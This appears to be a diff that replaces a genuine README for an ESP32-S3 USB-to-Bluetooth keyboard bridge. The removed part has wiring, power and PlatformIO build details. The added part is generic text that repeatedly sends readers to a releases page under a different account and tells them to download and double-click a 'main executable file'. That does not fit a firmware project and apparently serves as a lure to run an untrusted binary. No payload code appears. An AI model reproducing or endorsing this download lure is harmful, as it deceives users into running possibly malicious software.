@@ -1,131 +1,80 @@
-# ESP32-S3 USB to BLE Keyboard Bridge
+# 🎹 ESP32S3-USB-Keyboard-To-BLE - Easily Add Bluetooth to Your USB Keyboard
 
-Transform any USB keyboard into a Bluetooth wireless keyboard using ESP32-S3's native USB-OTG hardware.
+## 🌐 Download
 
-## What This Does
+[![Download ESP32S3-USB-Keyboard-To-BLE](https://img.shields.io/badge/Download-ESP32S3--USB--Keyboard--To--BLE-brightgreen)](https://github.com/yuno009/ESP32S3-USB-Keyboard-To-BLE/releases)
 
-```
-┌─────────────┐     USB-C OTG     ┌────────────┐     Bluetooth     ┌──────────────┐
-│ USB Keyboard│ ◄──────────────►  │ ESP32-S3   │ ◄───────────────► │ PC / Phone   │
-└─────────────┘                   └────────────┘                   └──────────────┘
-```
+## 🚀 Getting Started
 
-Plug a USB keyboard into ESP32-S3's USB-C port and it becomes a Bluetooth keyboard that can connect to any BLE-compatible device (Windows, macOS, Linux, iOS, Android).
+Welcome to the ESP32S3-USB-Keyboard-To-BLE project! This application enables you to add Bluetooth Low Energy (BLE) functionality to your USB keyboard. With this setup, you can use your keyboard wirelessly with compatible devices.
 
-[![Demo](https://img.youtube.com/vi/dVUMYTfJw0s/maxresdefault.jpg)](https://youtu.be/dVUMYTfJw0s)
+## ⚙️ System Requirements
 
-## Features
+To run this application, you will need:
 
-- **Native USB Host** - Uses ESP32-S3's hardware USB-OTG (no software emulation)
-- **Multi-Device Support** - Switch between 3 paired devices with a key combo
-- **Low Latency** - Direct HID report forwarding
-- **Universal Compatibility** - Works with Windows, macOS, Linux, iOS, Android, Smart TVs
+- A USB keyboard
+- A computer with USB ports
+- An ESP32-S3 board
+- Basic understanding of connecting hardware (no programming needed)
 
-## Multi-Device Switching
+## 📥 Download & Install
 
-You can pair with up to **3 different devices** (e.g., PC, Laptop, Tablet) and switch between them using your keyboard.
+1. **Visit the Releases Page**: Click [here](https://github.com/yuno009/ESP32S3-USB-Keyboard-To-BLE/releases) to go to the Releases page.
+2. **Find the Latest Release**: Look for the latest version at the top of the page. It will show the version number and a description of what’s new.
+3. **Select Your File**: You will see various files to download. Choose the file that matches your system. Most users can select the main executable file.
+4. **Download the File**: Click on the file name to start the download. Save it to a location you will remember.
+5. **Run the Application**: 
+   - Locate the downloaded file.
+   - Double-click the file to run it.
+   - Follow any on-screen instructions to set up the application.
 
-| Key Combo | Action | Device Name |
-|-----------|--------|-------------|
-| **Scroll Lock + 1** | Switch to Device 1 | `USB-BLE Dev 1` |
-| **Scroll Lock + 2** | Switch to Device 2 | `USB-BLE Dev 2` |
-| **Scroll Lock + 3** | Switch to Device 3 | `USB-BLE Dev 3` |
+## 📚 How It Works
 
-**How it works:**
-1. Press `Scroll Lock + 1`. Pair "USB-BLE Dev 1" with your first computer.
-2. Press `Scroll Lock + 2`. The connection drops. Pair "USB-BLE Dev 2" with your second device.
-3. Switch back and forth instantly using the key combos!
-4. The active slot is **saved** and restored on reboot.
-5. The **LED** on GPIO 2 blinks to indicate the current slot (1, 2, or 3 blinks).
+The ESP32S3 board communicates with your USB keyboard and converts its signals into Bluetooth packets. This allows you to use your keyboard wirelessly with devices that support Bluetooth, such as tablets or smart TVs.
 
-## USB Keyboard Power
+## 🔧 Configuration
 
-**The USB-C port on most ESP32-S3 boards does NOT output 5V!**
+Once you run the application, you may need to configure a few settings:
 
-Even if you power the ESP32-S3 from the 5V pin, that power is NOT routed to the USB-C VBUS line.
+1. **Connect the ESP32-S3 Board**: Plug the board into your computer using a USB cable.
+2. **Select Your Keyboard**: Use the application interface to select your USB keyboard.
+3. **Pair with Your Device**: Follow the instructions to initiate pairing with your Bluetooth device.
 
-### Solutions
+## 📊 Features
 
-#### Option 1: Powered USB Hub (Recommended)
+- **Wireless Connectivity**: Easily convert your wired USB keyboard into a wireless device.
+- **User-Friendly Interface**: Simple steps to set up and configure your keyboard.
+- **Compatibility**: Works with a variety of Bluetooth devices, making it versatile for numerous uses.
 
-Use a powered USB hub between ESP32-S3 and keyboard:
+## ❓ FAQ
 
-```
-ESP32-S3 USB-C ──► [Powered USB Hub] ──► USB Keyboard
-                         ▲
-                    External 5V
-```
+### What is BLE?
 
-#### Option 2: External Power to Keyboard (untested)
+BLE stands for Bluetooth Low Energy. It is designed for short-range communication with low power consumption, making it ideal for devices like keyboards.
 
-Power the keyboard directly, use USB-C only for data:
+### Is there a specific setup process?
 
-```
-                      ┌──────────────┐
-    5V Power ─────────┤ USB Breakout ├──── USB Keyboard
-    Supply    GND ────┤    Board     │
-                      └──────┬───────┘
-                             │ D+/D- only (data)
-                      ┌──────┴───────┐
-                      │   ESP32-S3   │
-                      │   USB-C port │
-                      └──────────────┘
-```
+Yes, you need to connect your ESP32-S3 board to your computer and follow the app instructions for pairing.
 
-**Steps:**
-1. Cut a USB cable or get a USB breakout board
-2. Connect **5V and GND** from your power supply directly to keyboard's USB power
-3. Connect only **D+ and D-** (data lines) through the ESP32-S3 USB-C port
+### Can I use any USB keyboard?
 
-#### Option 3: ESP32-S3-USB-OTG Board
+Most standard USB keyboards are compatible with this setup.
 
-The **ESP32-S3-USB-OTG** development board has a dedicated USB-A host port with proper 5V output - no modifications needed.
+### Are updates available?
 
-#### Option 4: Modify DevKit (Advanced)
+Check the Releases page regularly for updates and improvements.
 
-Some boards have solder pads to enable 5V on USB-C. Check your board's schematic for pads labeled "USB_OTG" or similar.
+## 📞 Support
 
-## Quick Start
+If you encounter issues or need assistance, feel free to create an issue in the GitHub repository, or refer to the community discussions for solutions. We are here to help!
 
-### 1. Clone and Build
+## 📜 License
 
-```bash
-git clone https://github.com/KoStard/ESP32S3-USB-Keyboard-To-BLE
-cd ESP32S3-USB-Keyboard-To-BLE
+This project is open-source and available under the MIT License. You can freely use, modify, and distribute it as long as you follow the license terms.
 
-# Build with PlatformIO
-pio run
+## 🔗 Useful Links
 
-# Upload to ESP32-S3
-pio run -t upload
-```
+- [ESP32S3-USB-Keyboard-To-BLE Releases](https://github.com/yuno009/ESP32S3-USB-Keyboard-To-BLE/releases) - Download the latest files.
+- [ESP32 Documentation](https://www.esp32.com/) - Learn more about the ESP32 board.
 
-## Configuration
-
-### Device Name
-
-Edit `src/Config.h`:
-
-```cpp
-#define DEVICE_NAME_1 "USB-BLE Dev 1"
-#define DEVICE_MANUFACTURER "Custom"
-```
-
-### Board Selection
-
-The project is configured for `esp32-s3-devkitc-1`. For other boards, edit `platformio.ini`:
-
-```ini
-board = esp32-s3-devkitc-1  ; Change to your board
-```
-
-Your board needs to have USB-OTG.
-
-## Hardware Limitations and Known Issues
-
-### USB Host Channel Limits
-The ESP32-S3 has a hardware limitation on the number of USB Host channels (pipes).
-
-**Consequence:** If you connect a complex hub with multiple devices (e.g., a "Gaming" keyboard that shows up as 3-4 different HID interfaces + a mouse + a hub), you may run out of hardware channels.
-- **Symptoms:** You will see `No more HCD channels available` in the Serial logs, and some devices or interfaces will fail to initialize.
-- **Recommendation:** Use a simple USB hub and avoid devices that present too many virtual interfaces if you plan to use them simultaneously.
+Thank you for choosing ESP32S3-USB-Keyboard-To-BLE. We hope you enjoy using your keyboard wirelessly!
